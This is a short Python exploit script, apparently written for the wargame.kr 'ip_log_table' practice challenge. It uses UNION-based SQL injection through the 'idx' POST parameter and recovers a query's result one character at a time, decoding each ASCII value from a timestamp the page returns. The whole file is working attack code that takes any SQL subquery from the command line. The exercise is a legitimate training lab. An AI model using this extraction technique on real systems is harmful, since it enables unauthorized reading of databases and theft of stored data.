import sys
from urllib import request, parse
import time, datetime

def to_timestamp(string):
    # print("string : " + string)
    return int(time.mktime(datetime.datetime.strptime(string, "%Y-%m-%d %H:%M:%S").timetuple()))

def get_ascii(param):
    data = parse.urlencode({ 'idx' : '77 union select ' + param}).encode()
    # print("data : ",  end = '')
    req = request.Request('http://wargame.kr:8080/ip_log_table/chk.php', data = data)
    response = request.urlopen(req).read().decode()
    # print("req : ", end='')
    # print(req)
    # print("res : ", end='')
    # print(response)
    
    return to_timestamp(response[response.find("<b>") + 3 : response.find("</b")])

def get_length(query):
    return get_ascii("length(%s)" % query)

def get_content(query):
    query = '(' + query + ')'
    content_len = get_length(query)
    content = ''
    # print(content_len)

    if content_len == 0:
        print('Invalid input')
        return ''
    
    for idx in range(1, content_len + 1):
        content += chr(get_ascii('ascii(substr(%s,%d,1))' % (query, idx)))
        sys.stdout.write('\r[' + str(content_len) + '] ' + content + '_' * (content_len - len(content)))

    sys.stdout.write('\n')

    return content



if len(sys.argv) < 2:
    sys.stdout.write('인자값이 없습니다.')
    exit()
print(sys.argv[1])
content = get_content(' '.join(sys.argv[1:]))
